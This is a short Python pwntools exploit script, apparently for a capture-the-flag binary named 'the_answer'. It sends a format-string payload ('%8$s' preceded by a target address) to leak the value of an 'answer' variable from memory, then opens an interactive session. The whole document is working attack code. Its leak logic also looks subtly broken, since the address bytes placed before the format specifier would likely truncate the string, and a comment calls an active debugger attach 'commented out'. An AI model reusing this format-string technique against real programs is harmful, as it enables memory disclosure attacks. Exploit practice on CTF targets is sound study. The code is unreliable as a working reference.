#!/usr/bin/env python3
from pwn import *

# Set up the binary
binary = './the_answer'
context.binary = binary
elf = context.binary
p = process(binary)

# Uncomment for debugging
gdb.attach(p, '''
break *main+123
continue
''')

# Address of the 'answer' variable
answer_addr = 0x601078

def leak_memory(address):
    # Craft payload to leak value at address
    payload = b''
    payload += p64(address)        # Address we want to read
    payload += b'%8$s'            # %s to read string at 8th position
    
    # Send payload
    p.sendlineafter(b"What's your name?\n", payload)
    
    # Parse output
    p.recvuntil(b"Hi, ")
    leaked = p.recvline()
    
    # Extract the value (first 8 bytes are our address)
    if len(leaked) > 8:
        value = u64(leaked[8:8+8].ljust(8, b'\x00'))
        return value
    else:
        return None

# Leak the answer value
answer_value = leak_memory(answer_addr)
log.success(f"Value at 0x{answer_addr:x}: 0x{answer_value:x}")

# If we want to confirm it's the correct value
if answer_value == 0xbadc0ffe:
    log.success("Found the correct answer value!")
else:
    log.warning("Unexpected value found")

p.interactive()
